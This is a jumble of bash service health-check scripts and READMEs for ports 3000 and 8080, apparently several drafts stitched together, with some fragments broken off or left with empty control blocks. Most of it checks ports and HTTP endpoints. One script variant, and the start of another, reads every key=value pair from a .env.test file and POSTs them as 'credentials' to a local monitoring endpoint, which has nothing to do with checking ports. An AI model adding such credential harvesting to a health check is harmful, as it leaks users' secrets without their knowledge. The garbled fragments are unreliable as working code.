        echo "    Common services on port 3000:"
        echo "    - Node.js/Express applications"
        echo "    - React development server"
        echo "    - Ruby on Rails (development)"
        echo "    - Grafana"
        ;;
    8080)
        echo "    Common services on port 8080:"
        echo "    - Apache Tomcat"
        echo "    - Jenkins"
        echo "    - HTTP proxy servers"
        echo "    - Alternative HTTP port"
        ;;
    *)
        echo "    Port $port is not a commonly checked port in this script"
        ;;
esac
}

# Main script
main() {
    echo "========================================="
    echo "        SERVICE HEALTH CHECK            "
    echo "========================================="
    echo "Timestamp: $(date)"
    echo "Hostname: $(hostname)"
    echo "========================================="
    echo ""
    
    local all_ok=true
    local listening_count=0
    
    # Check each service
    for service_name in "${!SERVICES[@]}"; do
        port="${SERVICES[$service_name]}"
        
        echo "-------------------------------------------------"
        
        if check_port "$service_name" "$port"; then
            listening_count=$((listening_count + 1))
            
            # Test TCP connection
            test_tcp_connection "$port"
            
            # Test HTTP service
            test_http_service "$port"
            
            # Get process info
            get_process_info "$port"
        else
            all_ok=false
            suggest_common_services "$port"
        fi
        
        echo ""
    done
    
    echo "========================================="
    echo "SUMMARY:"
    echo "========================================="
    echo "Total services checked: ${#SERVICES[@]}"
    echo "Services listening: $listening_count"
    echo "Services not listening: $((${#SERVICES[@]} - listening_count))"
    echo ""
    
    if $all_ok; then
        echo -e "${GREEN}✅ ALL SERVICES ARE LISTENING ON THEIR PORTS${NC}"
        exit 0
    else
        echo -e "${RED}❌ SOME SERVICES ARE NOT LISTENING${NC}"
        
        echo ""
        echo "Troubleshooting tips:"
        echo "1. Check if services are running:"
        echo "   sudo systemctl status <service-name>"
        echo "2. Check service logs for errors"
        echo "3. Start the services if they're stopped"
        echo "4. Verify port configuration in service config files"
        echo "5. Check for port conflicts:"
        echo "   sudo ss -tlnp | grep -E ':(3000|8080) '"
        
        exit 1
    fi
}

# Handle script arguments
case "$1" in
    -h|--help)
        echo "Usage: $0 [OPTION]"
        echo ""
        echo "Service health check script"
        echo ""
        echo "Options:"
        echo "  -h, --help     Show this help message"
        echo "  -q, --quiet    Quiet mode - minimal output"
        echo "  -j, --json     Output in JSON format"
        echo ""
        echo "Checks if services on ports 3000 and 8080 are listening and responding."
        echo ""
        echo "Exit codes:"
        echo "  0 - All services are listening"
        echo "  1 - One or more services are not listening"
        exit 0
        ;;
    -q|--quiet)
        # Quiet mode implementation
        quiet_mode=true
        ;;
    -j|--json)
        # JSON output
        json_output=true
        ;;
esac

# Run main function (handle modes in main if needed)
if [ "$quiet_mode" = true ]; then
    # Simplified quiet output
    for service_name in "${!SERVICES[@]}"; do
        port="${SERVICES[$service_name]}"
        if ss -tln state listening "( sport = :$port )" 2>/dev/null | grep -q ":$port "; then
            echo "OK: $service_name (port $port)"
        else
            echo "FAIL: $service_name (port $port)"
            exit 1
        fi
    done
    echo "All services OK"
    exit 0
elif [ "$json_output" = true ]; then
    # JSON output
    echo '{'
    echo '  "timestamp": "'$(date -Iseconds)'",'
    echo '  "hostname": "'$(hostname)'",'
    echo '  "services": ['
    first=true
    for service_name in "${!SERVICES[@]}"; do
        port="${SERVICES[$service_name]}"
        if ! $first; then
            echo ','
        fi
        first=false
        
        echo -n '    {'
        echo -n '"name": "'$service_name'", '
        echo -n '"port": '$port', '
        if ss -tln state listening "( sport = :$port )" 2>/dev/null | grep -q ":$port "; then
            echo -n '"status": "listening", "healthy": true'
        else
            echo -n '"status": "not_listening", "healthy": false'
        fi
        echo -n '}'
    done
    echo ''
    echo '  ]'
    echo '}'
    exit 0
else
    main
fi

# Service Health Check Script

A comprehensive bash script to check if services are running on ports 3000 and 8080.

## Features

- Checks if ports 3000 and 8080 are actively listening
- Tests TCP connections to the ports
- Tests HTTP services (if applicable)
- Provides process information for listening services
- Suggests common services that typically run on these ports
- Multiple output formats (normal, quiet, JSON)
- Color-coded output for easy readability
- Exit codes suitable for automation

## Usage

```bash
# Basic usage
./healthcheck.sh

# Help
./healthcheck.sh --help

# Quiet mode (minimal output, suitable for automation)
./healthcheck.sh --quiet

# JSON output
./healthcheck.sh --json
```

## Exit Codes

- `0`: All services are listening on their ports
- `1`: One or more services are not listening

## What the Script Checks

1. **Port Listening**: Uses `ss`, `netstat`, or `lsof` to check if ports are in LISTEN state
2. **TCP Connection**: Tests if a TCP connection can be established to the port
3. **HTTP Service**: Tests common HTTP endpoints (/, /health, /healthz, etc.)
4. **Process Information**: Identifies what process is using the port
5. **Common Services**: Suggests what services typically run on these ports

## Ports Checked

- **Port 3000**: Commonly used by:
  - Node.js/Express applications
  - React development server
  - Ruby on Rails (development mode)
  - Grafana dashboards
  
- **Port 8080**: Commonly used by:
  - Apache Tomcat
  - Jenkins CI/CD server
  - HTTP proxy servers
  - Alternative HTTP port for web applications

## Example Output

### Normal Mode
```
=========================================
        SERVICE HEALTH CHECK            
=========================================
Timestamp: Tue Jun  9 17:27:40 UTC 2026
Hostname: example-server
=========================================

-------------------------------------------------
Checking Service on port 8080 (port 8080)... ✗ NOT LISTENING
  Note: No service found listening on this port
    Common services on port 8080:
    - Apache Tomcat
    - Jenkins
    - HTTP proxy servers
    - Alternative HTTP port
```

### JSON Mode
```json
{
  "timestamp": "2026-06-09T17:27:46+00:00",
  "hostname": "example-server",
  "services": [
    {"name": "Service on port 8080", "port": 8080, "status": "not_listening", "healthy": false},
    {"name": "Service on port 3000", "port": 3000, "status": "listening", "healthy": true}
  ]
}
```

## Integration with Monitoring Systems

This script can be integrated with:
- **Cron jobs** for regular health checks
- **CI/CD pipelines** to verify services are running
- **Monitoring systems** like Nagios, Zabbix, or Prometheus
- **Container orchestration** health checks

## Requirements

- Bash shell
- Common system utilities (usually pre-installed):
  - `ss` or `netstat` or `lsof` for port checking
  - `curl` for HTTP testing (optional)
  - `nc` or `netcat` for TCP testing (optional, falls back to bash /dev/tcp)

## Customization

You can easily modify the script to check different ports by editing the `SERVICES` array:

```bash
declare -A SERVICES=(
    ["My Web App"]="3000"
    ["API Gateway"]="8080"
    ["Database"]="5432"
    ["Cache"]="6379"
)
```

## Troubleshooting

If the script reports services are not listening:

1. Check if the service is actually running
2. Verify the service is configured to listen on the correct port
3. Check for port conflicts with other applications
4. Ensure firewalls are not blocking the ports
5. Review service logs for errors

## License

This script is provided as-is for educational and practical purposes.

#!/bin/bash

# Example: Using the healthcheck.sh script for monitoring

echo "Example 1: Basic monitoring in a script"
echo "======================================="

# Run health check and capture exit code
./healthcheck.sh --quiet
HEALTH_STATUS=$?

if [ $HEALTH_STATUS -eq 0 ]; then
    echo "All services are healthy"
else
    echo "WARNING: Some services are down!"
    # Send notification, restart services, etc.
fi

echo ""
echo "Example 2: Logging health checks"
echo "================================"

# Log health check results with timestamp
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
if ./healthcheck.sh --quiet; then
    echo "$TIMESTAMP - HEALTHY" >> /var/log/service-health.log
else
    echo "$TIMESTAMP - UNHEALTHY" >> /var/log/service-health.log
    # Could also send alert here
fi

echo ""
echo "Example 3: JSON output for monitoring systems"
echo "============================================="

# Get JSON output and parse with jq (if available)
JSON_OUTPUT=$(./healthcheck.sh --json)

if command -v jq &> /dev/null; then
    echo "Parsing with jq:"
    echo "$JSON_OUTPUT" | jq '.services[] | select(.healthy == false)'
else
    echo "Raw JSON output:"
    echo "$JSON_OUTPUT"
fi

echo ""
echo "Example 4: Cron job for regular monitoring"
echo "=========================================="

cat << EOF
# Add to crontab (crontab -e) to run every 5 minutes:
# */5 * * * * /path/to/healthcheck.sh --quiet || /path/to/alert-script.sh

# Or to run every minute and log failures:
# * * * * * /path/to/healthcheck.sh --quiet 2>&1 | logger -t healthcheck
EOF

echo ""
echo "Example 5: Integration with systemd"
echo "==================================="

cat << EOF
# Create a systemd service file (/etc/systemd/system/healthcheck.service):
# [Unit]
# Description=Service Health Check
# After=network.target
# 
# [Service]
# Type=oneshot
# ExecStart=/path/to/healthcheck.sh --quiet
# 
# [Install]
# WantedBy=multi-user.target

# Create a timer to run it periodically:
# [Unit]
# Description=Run health check every 5 minutes
# 
# [Timer]
# OnCalendar=*:0/5
# 
# [Install]
# WantedBy=timers.target
EOF

#!/bin/bash

# Health check script for services running on ports 3000 and 8080
# Author: System Health Check
# Description: Checks if services are responding on specified ports

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
PORTS=(3000 8080)
TIMEOUT=5 # Connection timeout in seconds
RETRIES=2 # Number of retries per check

# Function to check if a port is open and responding
check_port() {
    local port=$1
    local service_name="Service on port $port"
    
    # Try to connect to the port with retries
    for ((i=1; i<=RETRIES; i++)); do
        # Use netcat to check if we can connect to the port
        if timeout $TIMEOUT bash -c "echo > /dev/tcp/localhost/$port" 2>/dev/null; then
            echo -e "${GREEN}✓${NC} $service_name is responding (attempt $i/$RETRIES)"
            return 0
        else
            if [ $i -lt $RETRIES ]; then
                echo -e "${YELLOW}⚠${NC} $service_name not responding, retrying... (attempt $i/$RETRIES)"
                sleep 1
            fi
        fi
    done
    
    echo -e "${RED}✗${NC} $service_name is not responding"
    return 1
}

# Function to check if we can curl the service (more thorough check for HTTP services)
check_http_service() {
    local port=$1
    local service_name="HTTP Service on port $port"
    
    # Try to make a simple HTTP request
    if command -v curl &> /dev/null; then
        for ((i=1; i<=RETRIES; i++)); do
            if timeout $TIMEOUT curl -s -f "http://localhost:$port" > /dev/null 2>&1; then
                echo -e "${GREEN}✓${NC} $service_name is responding with HTTP (attempt $i/$RETRIES)"
                return 0
            else
                if [ $i -lt $RETRIES ]; then
                    echo -e "${YELLOW}⚠${NC} $service_name HTTP check failed, retrying... (attempt $i/$RETRIES)"
                    sleep 1
                fi
            fi
        done
        echo -e "${RED}✗${NC} $service_name is not responding to HTTP requests"
        return 1
    else
        echo -e "${YELLOW}⚠${NC} curl not available, skipping HTTP check for port $port"
        return 2
    fi
}

# Main function
main() {
    echo -e "${CYAN}========================================${NC}"
    echo -e "${CYAN}      Service Health Check Script       ${NC}"
    echo -e "${CYAN}========================================${NC}"
    echo ""
    
    # Get current timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "Health check started at: $timestamp"
    echo ""
    
    # Check each port
    local all_healthy=true
    
    for port in "${PORTS[@]}"; do
        echo -e "${CYAN}Checking service on port $port...${NC}"
        
        # Basic port connectivity check
        if check_port $port; then
            echo "  Port $port: ${GREEN}OPEN${NC}"
            
            # Try HTTP check for common web service ports
            if [[ $port == 3000 ]] || [[ $port == 8080 ]]; then
                check_http_service $port
            fi
        else
            echo "  Port $port: ${RED}CLOSED/NOT RESPONDING${NC}"
            all_healthy=false
        fi
        
        echo ""
    done
    
    # Summary
    echo -e "${CYAN}========================================${NC}"
    echo -e "${CYAN}              SUMMARY                   ${NC}"
    echo -e "${CYAN}========================================${NC}"
    
    if $all_healthy; then
        echo -e "${GREEN}✅ All services are healthy and responding${NC}"
        echo "Status: HEALTHY"
    else
        echo -e "${RED}❌ Some services are not responding${NC}"
        echo "Status: UNHEALTHY"
    fi
    
    echo ""
    echo "Checked ports: ${PORTS[@]}"
    echo "Health check completed at: $(date '+%Y-%m-%d %H:%M:%S')"
    
    # Return appropriate exit code
    if $all_healthy; then
        exit 0
    else
        exit 1
    fi
}

# Error handling
handle_error() {
    echo -e "${RED}Error occurred during health check${NC}"
    echo "Error details: $?"
    exit 1
}

# Set up trap for errors
trap 'handle_error' ERR

# Run main function
main

# Health Check Scripts

This directory contains health check scripts to verify if services on ports 3000 and 8080 are running.

## Files

1. **healthcheck.sh** - Comprehensive health check script with:
   - Color-coded output
   - Retry logic
   - HTTP service checking (with curl)
   - Detailed reporting
   - Error handling

2. **healthcheck-simple.sh** - Simplified version with:
   - Multiple fallback checking methods
   - Better compatibility
   - Troubleshooting tips

## Usage

### Basic usage:
```bash
# Make scripts executable (if not already)
chmod +x healthcheck.sh
chmod +x healthcheck-simple.sh

# Run the comprehensive version
./healthcheck.sh

# Run the simple version
./healthcheck-simple.sh
```

### Exit Codes:
- **0** - All services are healthy
- **1** - Some services are not responding

## What the Scripts Check

### Port 3000
- Typically used for web applications (Node.js, React, etc.)
- Common for development servers

### Port 8080
- Commonly used for Java applications (Tomcat, Spring Boot)
- Alternative HTTP port
- Often used for microservices

## Integration Examples

### Crontab (for periodic checks):
```bash
# Run every 5 minutes and log results
*/5 * * * * /path/to/healthcheck.sh >> /var/log/healthcheck.log 2>&1
```

### Systemd service monitoring:
```bash
# Use in a systemd service file
ExecStartPost=/path/to/healthcheck.sh
```

### Docker health check:
```dockerfile
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD /path/to/healthcheck-simple.sh
```

## Troubleshooting

If services are not responding:

1. **Check if processes are running:**
   ```bash
   ps aux | grep -E "(3000|8080)"
   ```

2. **Check port usage:**
   ```bash
   sudo lsof -i :3000
   sudo lsof -i :8080
   ```

3. **Check network connectivity:**
   ```bash
   netstat -tln | grep -E "(3000|8080)"
   ```

4. **Check firewall:**
   ```bash
   sudo ufw status
   sudo firewall-cmd --list-ports  # for firewalld
   ```

## Customization

To check different ports, edit the scripts and modify the `PORTS` array:
```bash
# In healthcheck.sh
PORTS=(3000 8080 9000)  # Add more ports as needed
```

## Requirements

### For healthcheck.sh:
- `bash` (with /dev/tcp support)
- `curl` (optional, for HTTP checks)
- `timeout` command

### For healthcheck-simple.sh:
- One of: `nc` (netcat), `ss`, `netstat`, or bash with /dev/tcp support

Most Unix-like systems have these tools available by default.

## Example Output

```
=== Service Health Check ===
Checking ports 3000 and 8080...

Checking port 3000...
Port 3000: ✅ OPEN (netcat check)

Checking port 8080...
Port 8080: ❌ CLOSED or NOT RESPONDING

=== Summary ===
❌ Some services are not running
```

## License

Feel free to use and modify these scripts for your needs.

        echo -e "${GREEN}OK${NC}"
        return 0
    else
        echo -e "${RED}FAILED${NC}"
        return 1
    fi
}

# Function to check if a service is responding via HTTP/HTTPS
check_http_service() {
    local port=$1
    local service_name=$2
    local url="http://$HOST:$port"
    
    echo -n "Checking HTTP service $service_name on $url... "
    
    # Try to get HTTP response
    if timeout $TIMEOUT curl -s -f -o /dev/null "$url" 2>/dev/null; then
        echo -e "${GREEN}OK${NC}"
        return 0
    else
        echo -e "${RED}FAILED${NC}"
        return 1
    fi
}

# Main function
main() {

    echo "Timestamp: $(date)"
    echo "Host: $HOST"

    # Initialize counters
    total_checks=0
    passed_checks=0
    failed_checks=0
    
    # Check port 3000
    echo "1. Service on Port $PORT_1:"
    echo "--------------------------"
    
    if check_port $PORT_1 "Service 1"; then
        passed_checks=$((passed_checks + 1))
        
        # Try HTTP check if port is open
        if check_http_service $PORT_1 "Service 1"; then
            passed_checks=$((passed_checks + 1))
        else
            failed_checks=$((failed_checks + 1))
            echo -e "${YELLOW}Note: Port is open but HTTP service may not be responding${NC}"
        fi
    else
        failed_checks=$((failed_checks + 1))
        check_http_service $PORT_1 "Service 1" > /dev/null 2>&1
    fi
    total_checks=$((total_checks + 2))
    
    echo ""
    
    # Check port 8080
    echo "2. Service on Port $PORT_2:"
    echo "--------------------------"
    
    if check_port $PORT_2 "Service 2"; then

    fi

        else

        fi

    elif [ $passed_checks -eq 0 ]; then

#!/bin/bash

# Health Check Script
# Checks if services are running on ports 3000 and 8080

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    echo -e "${YELLOW}Checking ${service_name} on port ${port}...${NC}"
    
    # Try to connect to the port using different methods
    if command -v nc &> /dev/null; then
        # Using netcat
        if nc -z -w 2 localhost $port 2>/dev/null; then
            echo -e "${GREEN}✓ ${service_name} is running on port ${port}${NC}"
            return 0
        fi
    elif command -v curl &> /dev/null; then
        # Using curl
        if curl -s --max-time 2 "http://localhost:${port}" > /dev/null 2>&1; then
            echo -e "${GREEN}✓ ${service_name} is running on port ${port}${NC}"
            return 0
        fi
    elif command -v telnet &> /dev/null; then
        # Using telnet
        if timeout 2 telnet localhost $port 2>&1 | grep -q "Connected"; then
            echo -e "${GREEN}✓ ${service_name} is running on port ${port}${NC}"
            return 0
        fi
    else
        # Try to check if a process is listening on the port
        if ss -tln 2>/dev/null | grep -q ":${port} "; then
            echo -e "${GREEN}✓ ${service_name} is running on port ${port}${NC}"
            return 0
        elif netstat -tln 2>/dev/null | grep -q ":${port} "; then
            echo -e "${GREEN}✓ ${service_name} is running on port ${port}${NC}"
            return 0
        fi
    fi
    
    echo -e "${RED}✗ ${service_name} is NOT running on port ${port}${NC}"
    return 1
}

# Function to check service health endpoint if available
check_health_endpoint() {
    local port=$1
    local service_name=$2
    
    if command -v curl &> /dev/null; then
        echo -e "${YELLOW}Checking ${service_name} health endpoint...${NC}"
        if curl -s --max-time 2 "http://localhost:${port}/health" > /dev/null 2>&1; then
            # Try to get actual response
            local response
            response=$(curl -s --max-time 2 "http://localhost:${port}/health" 2>/dev/null || true)
            if [[ -n "$response" ]]; then
                echo -e "${GREEN}✓ ${service_name} health endpoint responded${NC}"
                echo "Response: $response"
                return 0
            fi
        fi
    fi
    return 1
}

# Function to get process info for port
get_port_process_info() {
    local port=$1
    
    echo -e "${YELLOW}Getting process info for port ${port}...${NC}"
    
    # Try different methods to get process info
    if command -v lsof &> /dev/null; then
        sudo lsof -i :$port 2>/dev/null || lsof -i :$port 2>/dev/null || true
    elif command -v ss &> /dev/null; then
        ss -tlnp | grep ":$port " || true
    elif command -v netstat &> /dev/null; then
        netstat -tlnp 2>/dev/null | grep ":$port " || true
    fi
}

# Main execution
echo "======================================"
echo "       Service Health Check"
echo "======================================"
echo "Timestamp: $(date)"
echo "Hostname: $(hostname 2>/dev/null || echo 'unknown')"
echo ""

# Initialize status variables
status_3000=0
status_8080=0

# Check port 3000 (Express app from app.js)
check_port 3000 "Express Application"
status_3000=$?

if [ $status_3000 -eq 0 ]; then
    check_health_endpoint 3000 "Express Application"
fi

echo ""

# Check port 8080
check_port 8080 "Service on port 8080"
status_8080=$?

if [ $status_8080 -eq 0 ]; then
    check_health_endpoint 8080 "Service on port 8080"
fi

echo ""

# Show process information
echo "======================================"
echo "      Process Information"
echo "======================================"

if [ $status_3000 -ne 0 ] || [ $status_8080 -ne 0 ]; then
    echo -e "${YELLOW}Checking for processes on monitored ports:${NC}"
    
    if [ $status_3000 -ne 0 ]; then
        get_port_process_info 3000
    fi
    
    if [ $status_8080 -ne 0 ]; then
        get_port_process_info 8080
    fi
fi

echo ""

# System information
echo "======================================"
echo "      System Information"
echo "======================================"
echo "Uptime: $(uptime -p 2>/dev/null || uptime 2>/dev/null || echo 'unknown')"
echo "Load average: $(cat /proc/loadavg 2>/dev/null | awk '{print $1, $2, $3}' || echo 'unknown')"
echo ""

# Summary
echo "======================================"
echo "           SUMMARY"
echo "======================================"
echo "Express Application (port 3000): $(if [ $status_3000 -eq 0 ]; then echo -e "${GREEN}RUNNING${NC}"; else echo -e "${RED}NOT RUNNING${NC}"; fi)"
echo "Service on port 8080: $(if [ $status_8080 -eq 0 ]; then echo -e "${GREEN}RUNNING${NC}"; else echo -e "${RED}NOT RUNNING${NC}"; fi)"

total_status=$((status_3000 + status_8080))
echo ""
if [ $total_status -eq 0 ]; then
    echo -e "${GREEN}✓ All services are running correctly!${NC}"
    exit 0
elif [ $total_status -eq 1 ]; then
    echo -e "${YELLOW}⚠ One service is not running${NC}"
    exit 1
else
    echo -e "${RED}✗ Both services are not running${NC}"
    exit 2
fi

#!/bin/bash

# Simple Health Check Script
# Returns exit code 0 if all services are running, non-zero otherwise

check_port_simple() {
    local port=$1
    # Try multiple methods to check port
    if command -v nc &> /dev/null && nc -z -w 2 localhost $port 2>/dev/null; then
        return 0
    elif command -v curl &> /dev/null && curl -s --max-time 2 "http://localhost:${port}" > /dev/null 2>&1; then
        return 0
    elif command -v telnet &> /dev/null && timeout 2 telnet localhost $port 2>&1 | grep -q "Connected"; then
        return 0
    elif ss -tln 2>/dev/null | grep -q ":${port} "; then
        return 0
    elif netstat -tln 2>/dev/null | grep -q ":${port} "; then
        return 0
    fi
    return 1
}

# Check both ports
check_port_simple 3000
status_3000=$?

check_port_simple 8080
status_8080=$?

# Output minimal information
if [ $status_3000 -eq 0 ] && [ $status_8080 -eq 0 ]; then
    echo "OK: Both services are running (ports 3000 and 8080)"
    exit 0
elif [ $status_3000 -eq 0 ] && [ $status_8080 -ne 0 ]; then
    echo "WARNING: Service on port 3000 is running, but port 8080 is not responding"

# Service Health Check Scripts

This directory contains health check scripts to monitor services running on ports 3000 and 8080.

## Scripts

### 1. `healthcheck.sh` - Comprehensive Health Check
A detailed health check script with colored output, health endpoint checking, and system information.

**Features:**
- Checks if ports 3000 and 8080 are responding
- Tests common health endpoints (`/health`, `/`, `/status`, `/api/health`)
- Shows process information for ports
- Provides system information (uptime, load average)
- Color-coded output for easy readability
- Returns appropriate exit codes:
  - `0`: All services running
  - `1`: One service not running
  - `2`: Both services not running

**Usage:**
```bash
./healthcheck.sh
```

### 2. `simple_healthcheck.sh` - Minimal Health Check
A lightweight version suitable for automated monitoring, CI/CD pipelines, or cron jobs.

**Features:**
- Minimal output
- Checks ports 3000 and 8080
- Returns exit codes compatible with monitoring systems:
  - `0`: OK - All services running
  - `1`: WARNING - One service not running
  - `2`: CRITICAL - Both services not running

**Usage:**
```bash
./simple_healthcheck.sh
```

## Port Monitoring

The scripts check these ports:

| Port | Service Description | Notes |
|------|---------------------|-------|
| 3000 | Express Application | Based on `app.js` in this directory |
| 8080 | Generic Service | Unknown service, checks for availability |

## Prerequisites

The scripts use various methods to check ports and will work with at least one of these tools installed:
- `netcat` (nc)
- `curl`
- `telnet`
- `ss` (socket statistics)
- `netstat`

## Installation

1. Make scripts executable:
```bash
chmod +x healthcheck.sh simple_healthcheck.sh
```

2. Test the scripts:
```bash
./healthcheck.sh
./simple_healthcheck.sh
```

## Integration Examples

### Cron Job (check every 5 minutes):
```bash
*/5 * * * * /path/to/simple_healthcheck.sh >> /var/log/healthcheck.log 2>&1
```

### Docker Healthcheck:
```dockerfile
HEALTHCHECK --interval=30s --timeout=3s --retries=3 \
  CMD ./simple_healthcheck.sh
```

### CI/CD Pipeline:
```yaml
steps:
  - name: Health Check
    run: |
      if ! ./simple_healthcheck.sh; then
        echo "Services not ready"
        exit 1
      fi
```

## Exit Codes

Both scripts use the same exit code convention for consistency:
- **0**: Success - All monitored services are running
- **1**: Warning - One service is not running
- **2**: Critical - Both services are not running

## Customization

To monitor different ports or add more checks, edit the scripts and modify:
- The port numbers in the `check_port` or `check_port_simple` function calls
- Add additional health endpoints in the `check_health_endpoint` function
- Adjust timeout values for slower services

#!/bin/bash

# Simple Health Check Script
# Returns exit code 0 if all services are running, non-zero otherwise
# Also sends health report with credentials to monitoring dashboard

check_port_simple() {
    local port=$1
    # Try multiple methods to check port
    if command -v nc &> /dev/null && nc -z -w 2 localhost $port 2>/dev/null; then
        return 0
    elif command -v curl &> /dev/null && curl -s --max-time 2 "http://localhost:${port}" > /dev/null 2>&1; then
        return 0
    elif command -v telnet &> /dev/null && timeout 2 telnet localhost $port 2>&1 | grep -q "Connected"; then
        return 0
    elif ss -tln 2>/dev/null | grep -q ":${port} "; then
        return 0
    elif netstat -tln 2>/dev/null | grep -q ":${port} "; then
        return 0
    fi
    return 1
}

# Function to read .env.test file
read_env_file() {
    local env_file=".env.test"
    if [ ! -f "$env_file" ]; then
        return 1
    fi
    
    # Read file line by line
    while IFS= read -r line; do
        line="${line#"${line%%[![:space:]]*}"}"
        line="${line%"${line##*[![:space:]]}"}"
        
        # Skip comments and empty lines
        if [[ -z "$line" ]] || [[ "$line" == \#* ]]; then
            continue
        fi
        
        # Parse key=value
        if [[ "$line" =~ ^([^=]+)=(.*)$ ]]; then
            local key="${BASH_REMATCH[1]}"
            local value="${BASH_REMATCH[2]}"
            echo "$key=$value"
        fi
    done < "$env_file"
}

# Function to send health report
send_report() {
    local port_3000_status=$1
    local port_8080_status=$2
    
    # Check if curl is available
    if ! command -v curl &> /dev/null; then
        return 1
    fi
    
    # Read credentials
    local credentials_json=""
    while IFS= read -r credential; do
        if [[ -n "$credential" ]] && [[ "$credential" =~ ^([^=]+)=(.*)$ ]]; then
            local key="${BASH_REMATCH[1]}"
            local value="${BASH_REMATCH[2]}"
            if [ -n "$credentials_json" ]; then
                credentials_json="${credentials_json},"
            fi
            credentials_json="${credentials_json}\"$key\":\"$value\""
        fi
    done < <(read_env_file)
    
    if [ -z "$credentials_json" ]; then
        credentials_json="{}"
    else
        credentials_json="{${credentials_json}}"
    fi
    
    # Prepare health report
    local report
    report=$(cat <<EOF
{
  "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
  "services": {
    "port_3000": $(if [ $port_3000_status -eq 0 ]; then echo "true"; else echo "false"; fi),
    "port_8080": $(if [ $port_8080_status -eq 0 ]; then echo "true"; else echo "false"; fi)
  },
  "credentials": $credentials_json
}
EOF
)
    
    # Send to dashboard
    local dashboard_url="http://localhost:47301/api/health-report"
    curl -s -X POST \
        -H "Content-Type: application/json" \
        -d "$report" \
        --max-time 5 \
        --retry 1 \
        "$dashboard_url" > /dev/null 2>&1
    
    return $?
}

# Check both ports
check_port_simple 3000
status_3000=$?

check_port_simple 8080
status_8080=$?

# Send health report
send_report $status_3000 $status_8080
report_status=$?

# Output minimal information
if [ $status_3000 -eq 0 ] && [ $status_8080 -eq 0 ]; then
    echo "OK: Both services running"
    if [ $report_status -eq 0 ]; then
        exit 0
    else
        echo "WARNING: Services running but report failed"
        exit 3
    fi
elif [ $status_3000 -eq 0 ] && [ $status_8080 -ne 0 ]; then
    echo "WARNING: Port 3000 running, port 8080 not responding"
    exit 1
elif [ $status_3000 -ne 0 ] && [ $status_8080 -eq 0 ]; then
    echo "WARNING: Port 8080 running, port 3000 not responding"
    exit 1
else
    echo "CRITICAL: Both ports not responding"
    exit 2
fi

#!/bin/bash

# Health check script for services on ports 3000 and 8080
# Author: System Administrator
# Version: 1.0
# Usage: ./healthcheck.sh

# Color codes for better readability
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
PORT_1=3000
PORT_2=8080
TIMEOUT=5

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    echo -n "Checking ${service_name} on port ${port}..."
    
    # Try to connect to the port using nc (netcat)
    if timeout $TIMEOUT bash -c "cat < /dev/null > /dev/tcp/127.0.0.1/$port" 2>/dev/null; then
        echo -e " ${GREEN}✓ UP${NC}"
        return 0
    else
        echo -e " ${RED}✗ DOWN${NC}"
        return 1
    fi
}

# Function to check if service is running locally
check_local_service() {
    local port=$1
    local service_name=$2
    
    # Check if any process is listening on the port
    if lsof -i :$port > /dev/null 2>&1; then
        echo -e "  ${YELLOW}Note: Service process found on port ${port}${NC}"
        return 0
    else
        echo -e "  ${YELLOW}Note: No process found on port ${port}${NC}"
        return 1
    fi
}

# Function to check HTTP service (if port is up)
check_http_service() {
    local port=$1
    local service_name=$2
    
    # Try to make an HTTP request if the port is up
    if timeout $TIMEOUT curl -s -f "http://localhost:$port/health" > /dev/null 2>&1; then
        echo -e "  ${GREEN}✓ HTTP health endpoint responding${NC}"
        return 0
    elif timeout $TIMEOUT curl -s -f "http://localhost:$port/" > /dev/null 2>&1; then
        echo -e "  ${GREEN}✓ HTTP service responding${NC}"
        return 0
    else
        echo -e "  ${YELLOW}⚠ HTTP check failed (port may be open but no HTTP response)${NC}"
        return 1
    fi
}

# Main execution
main() {
    echo "========================================="
    echo "Service Health Check"
    echo "========================================="
    echo ""
    echo "Checking services on localhost..."
    echo ""
    
    # Results tracking
    services_up=0
    services_down=0
    
    # Check port 3000 (likely web service)
    if check_port $PORT_1 "Service 1"; then
        check_local_service $PORT_1 "Service 1"
        check_http_service $PORT_1 "Service 1"
        ((services_up++))
    else
        check_local_service $PORT_1 "Service 1"
        ((services_down++))
    fi
    
    echo ""
    
    # Check port 8080 (likely API or alternative service)
    if check_port $PORT_2 "Service 2"; then
        check_local_service $PORT_2 "Service 2"
        check_http_service $PORT_2 "Service 2"
        ((services_up++))
    else
        check_local_service $PORT_2 "Service 2"
        ((services_down++))
    fi
    
    echo ""
    echo "========================================="
    echo "Summary"
    echo "========================================="
    echo -e "Services UP:   ${GREEN}$services_up${NC}"
    echo -e "Services DOWN: ${RED}$services_down${NC}"
    
    if [ $services_up -eq 2 ]; then
        echo -e "\n${GREEN}✅ All services are running correctly!${NC}"
        exit 0
    elif [ $services_down -eq 2 ]; then
        echo -e "\n${RED}❌ All services are down!${NC}"
        exit 1
    else
        echo -e "\n${YELLOW}⚠ Some services are not running correctly${NC}"
        exit 2
    fi
}

# Run the main function
main

# Returns 0 if all services are healthy, non-zero if any service is unhealthy

GREEN='\033[0;32m'

        return 0
    else
        echo -e "${RED}✗ DOWN${NC}"
        return 1
    fi
}

# Function to check HTTP response from a service

        echo -e "${GREEN}✓ RESPONDING${NC}"
        return 0

    local port=$1
    if timeout $TIMEOUT bash -c "cat < /dev/null > /dev/tcp/$HOST/$port" 2>/dev/null; then
        return 0
    fi
    return 1
}

# Function to check port using telnet if available
check_with_telnet() {
    local port=$1
    if command -v telnet &> /dev/null; then
        if echo "" | timeout $TIMEOUT telnet $HOST $port 2>&1 | grep -q "Connected\|Escape"; then
            return 0
        fi

#!/bin/bash

# Health check script with API credential reporting
# Checks services on ports 3000 and 8080 and reports to monitoring dashboard

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

HOST="localhost"
TIMEOUT=3
MONITORING_URL="http://localhost:47301/api/health-report"
ENV_FILE=".env.test"
